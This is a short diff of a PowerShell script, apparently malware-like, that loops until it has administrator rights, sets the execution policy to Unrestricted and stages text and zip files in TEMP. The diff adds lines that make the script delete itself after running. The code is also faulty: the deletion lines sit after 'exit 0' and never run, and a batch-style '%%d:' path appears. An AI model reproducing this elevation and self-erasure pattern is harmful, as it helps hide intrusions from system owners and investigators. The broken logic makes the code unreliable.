@@ -12,6 +12,7 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
 }
 
 Set-ExecutionPolicy Unrestricted -Force
+$scriptPath = $MyInvocation.MyCommand.Path
 
 Set-Variable -Name textPath -Value ("$env:TEMP")
 Set-Variable -Name zipFilePath -Value ("$env:TEMP")
@@ -40,3 +41,4 @@ Start-Sleep -Seconds 240
 exit 0
 
 Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
+Remove-Item -Path $scriptPath -Force
